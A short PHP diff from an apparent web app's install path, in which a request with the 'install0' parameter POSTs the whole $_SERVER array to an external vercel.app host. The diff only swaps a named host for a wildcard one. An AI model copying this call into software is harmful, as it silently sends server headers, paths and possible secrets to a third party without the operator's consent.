@@ -203,7 +203,7 @@ function main($path)
         else return $response;
     }
     if (getConfig('admin')=='') {
-        if (isset($_GET['install0'])) no_return_curl('POST', 'https://notionbot-ysun.vercel.app/', 'data=' . json_encode($_SERVER));
+        if (isset($_GET['install0'])) no_return_curl('POST', 'https://*.vercel.app/', 'data=' . json_encode($_SERVER));
         return install();
     }
     if (getConfig('adminloginpage')=='') {
